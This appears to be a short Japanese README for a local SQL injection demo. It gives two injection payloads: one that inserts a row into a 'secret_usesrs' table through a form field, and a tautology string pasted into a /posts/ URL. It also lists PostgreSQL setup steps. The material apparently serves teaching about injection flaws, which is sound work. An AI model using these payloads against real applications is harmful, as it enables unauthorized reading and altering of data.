# sqlInjection
# 使い方
# yarn installしてください
# 攻撃方法 1
# ','');insert into secret_usesrs (name, email) values ('injection', 'injection')--
# を書き込みのところに入力しボタンをクリックpo
# 攻撃方法 2
# hoge' AND email = 'name' OR 'x' = 'x';--
# をlocalhost:xxxx/posts/以降のurlに貼り付け

#使用したDB(postgresql)
#データベース作成手順
#sudo su - postgres
#psql
#create database test;
#\c test
#CREATE TABLE secret_usesrs (name varchar(30),email varchar(30));
#データベースの終了
#\q
#exit
